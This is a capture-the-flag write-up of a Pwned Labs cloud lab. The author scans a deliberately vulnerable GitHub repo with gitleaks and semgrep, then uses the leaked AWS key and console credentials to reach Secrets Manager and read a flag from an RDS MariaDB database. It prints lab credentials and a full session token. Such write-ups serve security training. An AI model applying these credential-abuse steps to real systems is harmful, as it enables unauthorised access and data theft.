https://app.pwnedlabs.io/labs/leverage-leaked-credentials-for-pwnage

### Scenario

In the ever-shifting world of logistics, Huge Logistics has emerged as an undisputed global leader. Yet, every Goliath has its vulnerabilities. Whispered rumors in cybersecurity circles suggest that amid the vast digital sprawl of Huge Logistics, there might lie unnoticed weaknesses. As a seasoned security consultant, your mission is set: Navigate the labyrinth of Huge Logistics' GitHub repositories, looking for the smallest chink in their armor. Dive deep, analyze thoroughly, and leave no stone unturned. Can you spot what others have missed?

### Information provided

```
https://github.com/huge-logistics/aws-react-app
```

### Enumeration

Since the github repo link is the only information provided to us, we have to explore it to get clues for our investigation.

```
git clone https://github.com/huge-logistics/aws-react-app
```

After cloning the repository, we will use `gitleaks` to find out any hardcoded credentials in the repo.

```
gitleaks detect -v
```

```
    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

Finding:     ...P_AWS_ACCESS_KEY_ID=AKIAWHEOTHRFVXYV44WP
Secret:      AKIAWHEOTHRFVXYV44WP
RuleID:      aws-access-token
Entropy:     3.821928
File:        .env
Line:        40
Commit:      48d24561bf29fe5a3990f9183d698b6e6fea8d4a
Author:      Jose Martinez
Email:       jose@pwnedlabs.io
Date:        2023-07-12T11:58:21Z
Fingerprint: 48d24561bf29fe5a3990f9183d698b6e6fea8d4a:.env:aws-access-token:40

8:09PM INF 2 commits scanned.
8:09PM INF scan completed in 273ms
8:09PM WRN leaks found: 1
```

As you can see, we have found a `AWS ACCESS KEY` but not the `SECRET ACCESS KEY`
We will also use `semgrep` to double check our result. It is a SAST tool.

```
semgrep --config "p/secrets"
```

```
┌──── ○○○ ────┐
│ Semgrep CLI │
└─────────────┘

Scanning 67 files (only git-tracked) with 52 Code rules:
            
  CODE RULES
                                                                                                                        
  Language      Rules   Files          Origin      Rules                                                                
 ─────────────────────────────        ───────────────────                                                               
  <multilang>      36      67          Community      52                                                                
  js                5       5                                                                                           
                                                                                                                        
                    
  SUPPLY CHAIN RULES
                                                                       
  💎 Sign in with `semgrep login` and run               
     `semgrep ci` to find dependency vulnerabilities and
     advanced cross-file findings.                                     
                                                                       
          
  PROGRESS
   
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                        
                   
                   
┌─────────────────┐
│ 2 Code Findings │
└─────────────────┘
                                     
    aws-react-app/.env
   ❯❯❱ generic.secrets.security.detected-aws-access-key-id-value.detected-aws-access-key-id-value
          ❰❰ Blocking ❱❱
          AWS Access Key ID Value detected. This is a sensitive credential and should not be hardcoded here.
          Instead, read this value from an environment variable or keep it in a separate, private file.     
          Details: https://sg.run/GeD1                                                                      
                                                                                                            
           40┆ REACT_APP_AWS_ACCESS_KEY_ID=AKIAWHEOTHRFVXYV44WP
                                                                   
    aws-react-app/database/factories/UserFactory.php
   ❯❯❱ generic.secrets.security.detected-bcrypt-hash.detected-bcrypt-hash
          ❰❰ Blocking ❱❱
          bcrypt hash detected        
          Details: https://sg.run/3A8G
                                      
           24┆ 'password' => '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', // password

                
                
┌──────────────┐
│ Scan Summary │
└──────────────┘
✅ Scan completed successfully.
 • Findings: 2 (2 blocking)
 • Rules run: 41
 • Targets scanned: 67
 • Parsed lines: ~100.0%
 • Scan skipped: 
   ◦ Files matching .semgrepignore patterns: 5
 • For a detailed list of skipped files and lines, run semgrep with the --verbose flag
Ran 41 rules on 67 files: 2 findings.
💎 Missed out on 218 pro rules since you aren't logged in!
⚡ Supercharge Semgrep OSS when you create a free account at https://sg.run/rules.

```

Here also we have detected the same access key for AWS and and another secret which we tried to decrypt but were unsuccessful.

#### Finding the Account ID

Using the `AWS ACCESS KEY` we can find out the account ID:-

```
aws sts get-access-key-info --access-key-id=AKIAWHEOTHRFVXYV44WP --profile Ayush
```

```
{
    "Account": "427648302155"
}
```

I have used my own AWS account for this step.

#### Exploring the `.env` file

In this file we find some more credentials:-

![](Pasted%20image%2020260915233147.png)

### Initial foothold

Lets use these username and password and the Account ID we enumerated to log in to the AWS management console!

![](Pasted%20image%2020260915233324.png)

We were able to log in using the credentials.

I tried to enumerate the IAM permissions using `pacu` with the credentials I got using the following method:-

```
Go to IAM ---> Inspect ---> Network tab ---> refresh ---> filter "creds"
```

This gives us the temporary credentials for the IAM service for this user which we can then import into `pacu`

![](Pasted%20image%2020260915233733.png)

However, we got no leads from `pacu`

```
Pacu (jose:imported-jose) > whoami
```

```
{
  "UserName": null,
  "RoleName": null,
  "Arn": null,
  "AccountId": null,
  "UserId": null,
  "Roles": null,
  "Groups": null,
  "Policies": null,
  "AccessKeyId": "ASIAWHEOTHRF6IRTFWBZ",
  "SecretAccessKey": "fFlaTp+FgTJN5iuBEBoM********************",
  "SessionToken": "IQoJb3JpZ2luX2VjEDoaCXVzLWVhc3QtMSJHMEUCIEY7jOahro43ykM2uFp+/ttAn6nG3u02eo28lPVPl4ftAiEA3NLTni8xpaNKre+2NkFjcuVqdCNeF01GGuRGURY6FZMq8AIIAhAAGgw0Mjc2NDgzMDIxNTUiDI1Kw2cOHn8bDxvVrCrNArex9ZKrG5IRlB4Vgdd0/U8H7vw0o84C8gkw9vT7KeFGrmKZbocPFLU+lpDKYhg4Oh9NX+inkWoWCu8RLetONsaRxn0n6sITQFmRUiO+3fjrHLOdOG7l15cuFvgfLH/ScEao10s/UW+hDdiAHum/oeUE481oOCzPyZa1XHPW+TQo5rCL33I+uaXQus3BYG7FA9eqbI2uqXximg4j3E2NILb2aDz2Xsd+7qxpyqsLcuzfHJXp+RFOv+Tg2/se5ZhvihjGKpZ+XpBD8wiEsRfKmvOf7WFIyzC1ZuDuPUmbsVkxQ2lFGcfIr2gr5B7L1BsI+Z4HVYkXdpQoJMHLNP3O15LZG1CibOJL8xI+cCGLzLAue7xxGBVs8MwjMh17IdAn9LsN9sSHdagzz17SiqGb9r2n6OnM7ai8dBj18k2og3swx5NPKInSQ85t4kfk8TCz96XVBjqtAsSx4d9XwiBqPKYCFQxes/rqCIFOpXTVqsTAJDhRVUymq/x6mS8PIBckcng81NXTgFI7G/NvRUdxzBP+QMHAs9TaEUiB7PSV6GHWLnI/qoNCnEYMFcJBt+LDuFOQVVKJ48LESwt/CqmVP7a01a87HlrceESD+wFfdDnMt4JapziWlUbvs4jGJz7x7+fE0fbg1+fffrVoz2obFODbfdDV2/HxK6nA+HhHrO1oQQogJQdpnYiASkCyuxJDj+PtdVtaB/judwerWBCww3LZm87rXdxpQOXztWrlQRPNWaLf+CH36zi/XzTtuN8q0hqQ9YmoSeVCA+Oo9Cqc43iPw20UOj6S4Wwtp2OgqkWfEnZRbRLGbnNTuV3lVIiaGOV1P5UhabTX+UX0F6GtoM4Q9S0=",
  "KeyAlias": "imported-jose",
  "PermissionsConfirmed": null,
  "Permissions": {
    "Allow": [],
    "Deny": []
  }
}
```

#### Secrets manager

After this we will explore the `secrets manager` since it was present in the recently viewed services.

![](Pasted%20image%2020260915233932.png)

We were able to retrieve the values of one of the secrets which reveals information about `mariadb` database. 

### Data exfiltration

We will use the information we received in `secrets manager` to connect to the database using `mysql-cli`

```
mysql -h employees.cwqkzlyzmm5z.us-east-1.rds.amazonaws.com -P 3306 -u reports_clone -D employees -p
```

After connecting to the database, we can use the following commands to finally get the flag.

```
SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
+--------------------+
```

```
USE employees;
```

```
SHOW TABLES;
+---------------------+
| Tables_in_employees |
+---------------------+
| countries           |
| departments         |
| dependents          |
| employees           |
| flag                |
| jobs                |
| locations           |
| regions             |
+---------------------+
```

```
SELECT * FROM flag;
+----------------------------------+
| flag                             |
+----------------------------------+
| d0e4b22<REDACTED>                |
+----------------------------------+
```




